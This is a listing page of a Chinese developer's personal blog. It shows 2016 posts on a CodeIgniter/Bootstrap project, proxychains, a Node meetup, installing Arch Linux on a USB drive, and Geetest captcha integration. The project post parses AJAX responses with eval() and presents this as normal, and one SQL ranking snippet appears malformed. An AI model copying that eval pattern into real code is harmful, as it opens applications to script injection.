
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  
    <title>A1exlism</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="a1exlism">
    

    
    <meta name="description" content="a1exlism&apos;s Blog">
<meta property="og:type" content="website">
<meta property="og:title" content="A1exlism">
<meta property="og:url" content="http://csser.work/page/3/index.html">
<meta property="og:site_name" content="A1exlism">
<meta property="og:description" content="a1exlism&apos;s Blog">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="A1exlism">
<meta name="twitter:description" content="a1exlism&apos;s Blog">
<link rel="publisher" href="106896526077043222500">

    
    <link rel="alternative" href="/sitemap.xml" title="A1exlism" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/a1exlism.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/a1exlism.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>

  <body>
    <header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo.png" alt="A1exlism" title="A1exlism"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="A1exlism">A1exlism</a></h1>
				<h2 class="blog-motto">嗯, 路走就对了</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/tags">Tags</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
						<form class="search" action="" method="get" accept-charset="utf-8">
							<input type="text" class="st-default-search-input" style="webkit-border-radius: 0;border-radius: 0;border-color: #fff" placeholder="Search">
						</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main">

   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/11/22/2016/proj-ci/" title="CI and Bootstrap项目开发小结" itemprop="url">CI and Bootstrap项目开发小结</a>
  </h1>
  <p class="article-author">By
       
		<a href="https://plus.google.com/106896526077043222500?rel=author" title="a1exlism" target="_blank" itemprop="author">a1exlism</a>
		
  <p class="article-time">
    <time datetime="2016-11-21T16:00:00.000Z" itemprop="datePublished"> 发表于 11-22-2016</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h2 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h2><p>刚需, 第一次写后端, 第一次前后端分离这么彻底.<br>项目介绍: 一个在线<code>类</code>oj的评测系统(没有后台沙盒什么的跑程序), 有后台和用户端两个入口.<br>jquery正式接触, 用的不熟..写这篇文章主要是记录一下部分开发过程中遇到的一些实际问题.<br>CI版本:3.1.2</p>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main();"></a>Main();</h2><h3 id="front-end"><a href="#front-end" class="headerlink" title="front-end"></a>front-end</h3><ol>
<li><blockquote>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/classList" target="_blank" rel="external">JS控制元素的class(增删改查API)</a> <br><br>div.classList.add(CLASS)<br>.remove(CLASS)<br>.contain(CLASS)</p>
</blockquote>
</li>
<li><p><a href="http://caibaojian.com/jquery-each-json.html" target="_blank" rel="external">ajax对php echo的数据处理</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">	...,</span><br><span class="line">	success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">		data = <span class="built_in">eval</span>(data);		<span class="comment">//	string 转换为json对象</span></span><br><span class="line">		<span class="keyword">for</span> (key <span class="keyword">in</span> data) &#123;</span><br><span class="line">			<span class="built_in">console</span>.log(data[key]);	<span class="comment">//	对象遍历</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>jQuery对ajax的各种封装方法<br><a href="https://my.oschina.net/LuckyWinty/blog/637632?fromerr=lVC30yU2" target="_blank" rel="external">https://my.oschina.net/LuckyWinty/blog/637632?fromerr=lVC30yU2</a></p>
</li>
<li><p>jQuery获取动态绑定对象<br><a href="http://www.mr-jie.com/?id=39" target="_blank" rel="external">模拟document点击事件</a></p>
</li>
<li><p><a href="https://www.formget.com/css-design-in-select-option/" target="_blank" rel="external">下拉栏的css设置</a></p>
</li>
</ol>
<h3 id="server-side"><a href="#server-side" class="headerlink" title="server-side"></a>server-side</h3><ol>
<li><p>session加载错误<br>错误描述：<br>Message: mkdir() [function.mkdir]: Invalid argument<br>Message: Session: Configured save path ‘’ is not a directory, doesn’t exist or cannot be created.<br>解决方案：<br>更改 application/config/config.php中的<code>$config[&#39;sess_save_path&#39;]</code><br>refer:<a href="http://codeigniter.org.cn/forums/thread-21295-1-1.html" target="_blank" rel="external">http://codeigniter.org.cn/forums/thread-21295-1-1.html</a></p>
</li>
<li><p>CI多入口解决方案<br>见blog-CI 分类</p>
</li>
<li><p>改进load-&gt;view()进行多页面不同的资源文件加载</p>
<blockquote>
<p><a href="http://www.dewen.net.cn/q/1702/PHP+CI+$this-&gt;load-&gt;view(" target="_blank" rel="external">冯义军@德问</a>;方法修改)<br>loadfile.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$config[<span class="string">'loadfile'</span>] = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'js'</span> =&gt; <span class="keyword">array</span>(<span class="string">'base'</span>=&gt; <span class="keyword">array</span>(<span class="string">'common.js'</span>,<span class="string">'base.js'</span>,<span class="string">'lib.js'</span>),<span class="string">'full'</span> =&gt; <span class="string">'xx.js'</span>,<span class="string">'xxx1.js'</span>,<span class="string">'.....'</span>,<span class="string">'homePage'</span> =&gt; <span class="string">'xxx.js'</span>);</span><br><span class="line"><span class="string">'css'</span> =&gt; ....</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ol>
<p>那么在load view 前更具不同的页面先调用不同的配置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span> -&gt; load -&gt; config(<span class="string">'loadfile'</span>);</span><br><span class="line">$loadFiles = <span class="keyword">$this</span> -&gt; config -&gt; item(<span class="string">'loadfile'</span>);</span><br><span class="line">$data[<span class="string">'js'</span>] =  $loadFiles[<span class="string">'js'</span>][<span class="string">'homePage'</span>];</span><br><span class="line">$data[<span class="string">'css'</span>] = $loadFiles[<span class="string">'css'</span>][<span class="string">'base'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;load-&gt;view(<span class="string">"xxx"</span>,$data);</span><br></pre></td></tr></table></figure></p>
<p>在xxx模板页面中写：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">$this</span>-&gt;load-&gt;view(<span class="string">'header'</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>在header文件中引入js和css的地方写为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>($js <span class="keyword">as</span> $jsf)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript" src="xxx/js/'</span>.$jsf.<span class="string">'"&gt;&lt;/script&gt;'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($css <span class="keyword">as</span> $cssf)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;link rel="stylesheet" type="text/css" href="css/'</span>.$cssf.<span class="string">'" /&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><ol>
<li>获取排名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) + <span class="number">1</span> <span class="keyword">from</span> <span class="keyword">TABLE</span> <span class="keyword">where</span> score &gt; (<span class="keyword">select</span> score <span class="keyword">from</span> <span class="keyword">TABLE</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="keyword">ID</span>) <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>如果有时间字段, 则加一个字段即可.</p>
<ol>
<li><code>MySQL</code>中无法对一张表同时update和select<br><a href="http://stackoverflow.com/questions/45494/mysql-error-1093-cant-specify-target-table-for-update-in-from-clause" target="_blank" rel="external">MySQL Error 1093 - Can’’t specify target table for update in FROM clause</a></li>
</ol>
<p>利用别名设置成新表.例子:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 按照每个用户抢到二楼的数量从多到少对用户排序</span></span><br><span class="line"><span class="keyword">SELECT</span> reply_id, <span class="keyword">count</span>(<span class="keyword">floor</span>) <span class="keyword">AS</span> c <span class="keyword">FROM</span></span><br><span class="line">  (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> replies <span class="keyword">WHERE</span> <span class="keyword">floor</span> = <span class="number">2</span>) <span class="keyword">AS</span> T</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> reply_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> c;</span><br></pre></td></tr></table></figure></p>
<h3 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h3><p>后记: 感觉自己开发周期太长了= =</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">


<div class="comments-count">
	
	  	<span></span>
		<a href="/11/22/2016/proj-ci/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/22/2016/proj-ci/" data-count-type="comments">&nbsp;</a>
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/11/09/2016/linux-proxychains/" title="Linux佳软推荐_proxychains" itemprop="url">Linux佳软推荐_proxychains</a>
  </h1>
  <p class="article-author">By
       
		<a href="https://plus.google.com/106896526077043222500?rel=author" title="a1exlism" target="_blank" itemprop="author">a1exlism</a>
		
  <p class="article-time">
    <time datetime="2016-11-08T16:00:00.000Z" itemprop="datePublished"> 发表于 11-09-2016</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h3 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h3><p>实在受不了有时候浏览器下载时快时慢的问题, 问了下同学, 道:”prxoychains能给软件直接前置代理”.</p>
<h3 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h3><p>安装配置很简单<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install proxychains</span><br><span class="line">sudo vi /etc/proxychains.conf</span><br><span class="line"><span class="comment"># 按照格式写就行了</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>使用<br>proxychains wget <a href="http://xxx.xxx.xxx" target="_blank" rel="external">http://xxx.xxx.xxx</a><br>proxychains slack</p>
</blockquote>
<p>找的时候顺便看到了一个比较好的一个网站<br><a href="https://www.hidemyass.com/proxy" target="_blank" rel="external">hidemyass</a></p>
<p>以前还觉得这个好辣鸡, 看到这个下载速度就感觉以前好蠢= =</p>
<hr>
<h3 id="17-3-12-update"><a href="#17-3-12-update" class="headerlink" title="17-3-12 update"></a>17-3-12 update</h3><p>一直懒得改..</p>
<p>鉴于一些app和原生的proxychains不兼容, 所以加一个<a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="external">proxychains-ng</a><br>混合使用挺好的, PS: npm建议不要用<br>cmd:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4</span><br></pre></td></tr></table></figure></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">


<div class="comments-count">
	
	  	<span></span>
		<a href="/11/09/2016/linux-proxychains/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/09/2016/linux-proxychains/" data-count-type="comments">&nbsp;</a>
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/10/22/2016/node-party/" title="Node Party[3nd]小记" itemprop="url">Node Party[3nd]小记</a>
  </h1>
  <p class="article-author">By
       
		<a href="https://plus.google.com/106896526077043222500?rel=author" title="a1exlism" target="_blank" itemprop="author">a1exlism</a>
		
  <p class="article-time">
    <time datetime="2016-10-21T16:00:00.000Z" itemprop="datePublished"> 发表于 10-22-2016</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>挺喜欢js的, 看到这个就报名了, 报名费居然也在红包中返回了手上(233).</p>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h2><h3 id="0x01-the-missing-part-of-TDD-shupengfei"><a href="#0x01-the-missing-part-of-TDD-shupengfei" class="headerlink" title="0x01. the missing part of TDD @shupengfei"></a>0x01. the missing part of TDD <code>@shupengfei</code></h3><p>Test-Driven Development 驱动测试开发, 差不多像单元测试<br>说实话, tdd这个经常在node的文档中看到, 但是自己也没有写过, 仅限于能看懂.<br>dalao的演讲受益匪浅, 做了笔记, 写在这里</p>
<blockquote>
<p>“所有代码都会腐烂”<br>“这个代码应该有人来重构一下, 但不是我” 都表明了在长时间之后的代码变得难以读懂, 难以维护.<br>所以tdd就上线来解决这个问题了~</p>
</blockquote>
<p>我听完演讲之后对tdd操作的理解: 由简到繁, function(x)给个要求之后用最少代码实现.<br>if是while的unit, 这个也挺有意思的~<br>还有演讲示例用到了<code>递归</code>, 递归其实挺好用的, 如果不溢出, 按照摩尔定律, 这个性能问题会逐渐消失(除非你代码有fatal error).</p>
<p>演讲用到了两个例子:</p>
<ol>
<li><p>factorization<br>要求只能按照记忆来了:[] -&gt; [1] -&gt; [2] -&gt; [n](出现问题,分类讨论) -&gt; [2,2] -&gt; [2, 4] -&gt; [3, 3]…</p>
</li>
<li><p>Sort Alogrithm<br>[] -&gt; [1] -&gt; [1,2] -&gt; [1,3,2](出现问题, 进一步讨论) -&gt; [3,2,1] -&gt; [x, y, z]</p>
</li>
</ol>
<h3 id="0x02-Atom背后的故事-jysperm"><a href="#0x02-Atom背后的故事-jysperm" class="headerlink" title="0x02. Atom背后的故事@jysperm"></a>0x02. Atom背后的故事<code>@jysperm</code></h3><p>以前用atom的时候很多sublime的操作虽然有兼容, 但是atom始终没办法和sublime比运行速度, 总是用着用着就用回sublime了…遇到问题很多时候都会跳转到精子哥的中文社区<a href="https://atom-china.org/" target="_blank" rel="external">atom中文社区</a>, 今天见到还是挺开心的.</p>
<p>atom和vscode的模型我还真没去自己研究过, 发现就是<code>electron APP</code>, 下图是electron组件图:<img src="/imgs/conferences/node_party/3_1.png" alt="1"><br>优点很明显</p>
<blockquote>
<p>内置chromium内核, 不需要用户支持更新;Node版本自己控制, 随时可以使用最新的语法;Native APIs的原生支持, 保证了跨平台的支持.</p>
</blockquote>
<p>后面的话就是一些关于atom的一些hack定制, 和内置的API调用模式等等, 然后也提到了atom的性能问题,比如:<br>1.内置的node_modules整合为单文件模式app.asar, 解决大量小文件读写速度慢的问题;<br>2.利用<code>virtual dom</code>来解决<code>reflow &amp; repaint</code>的多次渲染问题;<br>3.针对于大文件加载, 使用了<code>transform3d</code>来进行块加载, 每次只加载需要显示的部分.</p>
<h3 id="0x03-Prototype-of-“JS-Native”"><a href="#0x03-Prototype-of-“JS-Native”" class="headerlink" title="0x03. Prototype of “JS-Native”"></a>0x03. Prototype of “JS-Native”</h3><p>这个看完ppt然后也没得出什么结论, 就不写了.</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">


<div class="comments-count">
	
	  	<span></span>
		<a href="/10/22/2016/node-party/#comments" class="ds-thread-count comments-count-link" data-thread-key="10/22/2016/node-party/" data-count-type="comments">&nbsp;</a>
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/10/16/2016/arch-efi-udisk-install/" title="Arch (U)EFI安装至U盘" itemprop="url">Arch (U)EFI安装至U盘</a>
  </h1>
  <p class="article-author">By
       
		<a href="https://plus.google.com/106896526077043222500?rel=author" title="a1exlism" target="_blank" itemprop="author">a1exlism</a>
		
  <p class="article-time">
    <time datetime="2016-10-15T16:00:00.000Z" itemprop="datePublished"> 发表于 10-16-2016</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>Ubuntu用久了也有点乏味, 部分软件用的也不舒服, 正好win盘区也要删了, 打算大半个月后上Arch.<br>anyway, 先用U盘系统练练手吧~</p>
<p>帮助文档就一个.<a href="https://wiki.archlinux.org/index.php/Installation_guide_" target="_blank" rel="external">arch-wiki</a></p>
<h2 id="U盘分区"><a href="#U盘分区" class="headerlink" title="U盘分区"></a>U盘分区</h2><p>扯: 以前用的DiskGenius进行的GPT分区, 现在在ubuntu下替代品是<code>gparted</code>, 感觉是更加高效, 不过好像没看到4k对齐这个功能..</p>
<p>EFI引导的系统就和前面DiskGenius设置的一样有个ESP(EFI System Partition)分区, 还有个MSR分区(查了一下, 非特殊情况可忽略)</p>
<p>这边给两个参考:<br><a href="https://my.oschina.net/abcfy2/blog/491140" target="_blank" rel="external">U盘引导多个linux镜像安装,同时支持BIOS和UEFI模式-oschina</a> <a href="https://jiavictor.wordpress.com/2010/03/12/gpt%E5%88%9D%E6%8E%A2%EF%BC%88%E6%88%91%E6%89%BF%E8%AE%A4%E6%88%91%E5%BE%88%E8%90%BD%E5%90%8E%EF%BC%8C%E5%BE%88%E8%90%BD%E5%90%8E%EF%BC%81%EF%BC%89/" target="_blank" rel="external">gpt初探（我承认我很落后，很落后！）</a></p>
<p>安装下gparted(GUI),</p>
<h3 id="设置GPT分区"><a href="#设置GPT分区" class="headerlink" title="设置GPT分区"></a>设置GPT分区</h3><p>进入gparted, device &gt; create partition tables &gt; select “GPT” 此操作会<code>清空u盘数据</code></p>
<h3 id="创建ESP分区"><a href="#创建ESP分区" class="headerlink" title="创建ESP分区"></a>创建ESP分区</h3><p>new &gt; partition , 类型<code>fat32</code>, 大小300M. 创建完之后 manage flag, 更改为 <code>ESP</code>, 默认会同时选择Boot.</p>
<h3 id="检查ESP"><a href="#检查ESP" class="headerlink" title="检查ESP"></a>检查ESP</h3><blockquote>
<p>查看自己的u盘挂载点<br>sudo fdisk -l</p>
<p>查看是否为GPT格式<br>sudo gdisk -l /dev/sdc # 填自己的device</p>
<p>查看ESP生成是否正确<br>sudo parted /dev/sdc print</p>
</blockquote>
<p>主要看起始点是否在<code>EF00</code>, flag显示boot, esp</p>
<p>样例图:<br><img src="/imgs/arch_efi_udisk_install/1.png" alt="1"><br><img src="/imgs/arch_efi_udisk_install/2.png" alt="2"></p>
<h3 id="硬盘分区"><a href="#硬盘分区" class="headerlink" title="硬盘分区"></a>硬盘分区</h3><p>分区划分的话可以从这边找到<a href="https://wiki.archlinux.org/index.php/Partitioning_" target="_blank" rel="external">https://wiki.archlinux.org/index.php/Partitioning_</a></p>
<p>不过鉴于U盘一共也才30G, 所以设置如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/efi 	sda1 300M</span><br><span class="line">/boot sda2 500M	<span class="comment">#看了视频后才加的, 不是很懂~</span></span><br><span class="line">/ 		sda3 12G</span><br><span class="line">/home	sda4 8G</span><br><span class="line">/var	sda5 5G</span><br><span class="line">swap	sda6 4G</span><br></pre></td></tr></table></figure></p>
<p>分区工具<code>gdisk</code>, 还是视频比较好接受一点..给个Youtube视频:</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/El8z3UkTHcg" frameborder="0" allowfullscreen></iframe>

<p>分区完之后检查:<br>sudo fdisk -l<br><img src="/imgs/arch_efi_udisk_install/3.png" alt="3"></p>
<h3 id="分区格式化"><a href="#分区格式化" class="headerlink" title="分区格式化"></a>分区格式化</h3><p>工具: <code>mkfs.xxx</code>, <code>mkswap</code> xxx表示文件格式, 第二个顾名思义, 创建swap空间</p>
<p>mkfs –help 这个帮助文档很简洁~</p>
<h3 id="分区挂载"><a href="#分区挂载" class="headerlink" title="分区挂载"></a>分区挂载</h3><p>工具<code>mount</code></p>
<blockquote>
<p>样例: 挂载设备sda2 到/boot<br>mount /dev/sda2 /boot</p>
</blockquote>
<p><code>Warning: 这个是还没有安装的情况下, 需要mount在mnt下</code><br>这边的文件结构将efi放到了/mnt/boot下, 所有的一切本质都是文件操作, 所以需要创建一个<code>/mnt/boot/efi</code>文件夹,之后挂载/dev/sda1</p>
<h2 id="Other-Important"><a href="#Other-Important" class="headerlink" title="Other Important"></a>Other Important</h2><p>官方Wiki介绍的很详细, 所以有一部分我就不写了</p>
<h3 id="关于安装时候的tips"><a href="#关于安装时候的tips" class="headerlink" title="关于安装时候的tips"></a>关于安装时候的tips</h3><p>记得设置一下/etc/pacman.conf<br>开启<code>TotalDownload</code></p>
<h3 id="关于-mnt-etc-fstab"><a href="#关于-mnt-etc-fstab" class="headerlink" title="关于/mnt/etc/fstab"></a>关于/mnt/etc/fstab</h3><p><img src="/imgs/arch_efi_udisk_install/4.png" alt="4"><br>cat了一下, 发现是开机自动mount的配置文件, 前面的swap现在就可以加上去了</p>
<h3 id="关于chroot"><a href="#关于chroot" class="headerlink" title="关于chroot"></a>关于chroot</h3><p>用了发现相当于复制了一个完全的环境变量.</p>
<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>学了一点命令下的工具吧, 还有一些思想~</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">


<div class="comments-count">
	
	  	<span></span>
		<a href="/10/16/2016/arch-efi-udisk-install/#comments" class="ds-thread-count comments-count-link" data-thread-key="10/16/2016/arch-efi-udisk-install/" data-count-type="comments">&nbsp;</a>
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/10/07/2016/php-ci-verification/" title="CodeIgniter使用极验验证" itemprop="url">CodeIgniter使用极验验证</a>
  </h1>
  <p class="article-author">By
       
		<a href="https://plus.google.com/106896526077043222500?rel=author" title="a1exlism" target="_blank" itemprop="author">a1exlism</a>
		
  <p class="article-time">
    <time datetime="2016-10-06T16:00:00.000Z" itemprop="datePublished"> 发表于 10-07-2016</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h2 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h2><p>怕存在不正当请求导致的服务器ddos, 采用<code>极验验证</code>进行部分阻挡~<br>参考了底下的thinkphp教程</p>
<h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p>Demo项目</p>
<blockquote>
<p>git clone <a href="https://github.com/GeeTeam/gt-php-sdk.git" target="_blank" rel="external">https://github.com/GeeTeam/gt-php-sdk.git</a></p>
</blockquote>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h2><h3 id="demo目录结构"><a href="#demo目录结构" class="headerlink" title="demo目录结构"></a>demo目录结构</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gt-php-sdk/</span><br><span class="line">├── composer.json <span class="comment">#标志/可删</span></span><br><span class="line">├── config</span><br><span class="line">│   └── config.php <span class="comment">#内建环境变量</span></span><br><span class="line">├── lib</span><br><span class="line">│   └── class.geetestlib.php <span class="comment">#封装类库</span></span><br><span class="line">├── README.rst</span><br><span class="line">├── static</span><br><span class="line">│   └── login.html <span class="comment">#前端页面</span></span><br><span class="line">└── web</span><br><span class="line">    ├── StartCaptchaServlet.php <span class="comment">#遮罩controllers</span></span><br><span class="line">    └── VerifyLoginServlet.php <span class="comment">#验证controllers</span></span><br></pre></td></tr></table></figure>
<h3 id="前端页面"><a href="#前端页面" class="headerlink" title="前端页面"></a>前端页面</h3><p>用的<code>bootstrap</code>框架<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span> <span class="attr">id</span>=<span class="string">"login-div"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-10 col-xs-offset-1 col-md-4 col-md-offset-4"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form-login"</span> <span class="attr">action</span>=<span class="string">"login"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">role</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">id</span>=<span class="string">"user-login"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span> <span class="attr">tabindex</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"pass-login"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span> <span class="attr">tabindex</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-8 col-xs-offset-2 col-lg-10 col-lg-offset-1"</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Login In"</span> <span class="attr">id</span>=<span class="string">"cover-submit-login"</span> <span class="attr">class</span>=<span class="string">"btn btn-success form-control"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"mask"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"popup-captcha"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="集成类库"><a href="#集成类库" class="headerlink" title="集成类库"></a>集成类库</h3><p>CI在application目录下有个<code>library</code>目录, 在里面创建一个名为<code>Geetestlib</code>的php文件.<br>内容和class一样, 通过class封装.</p>
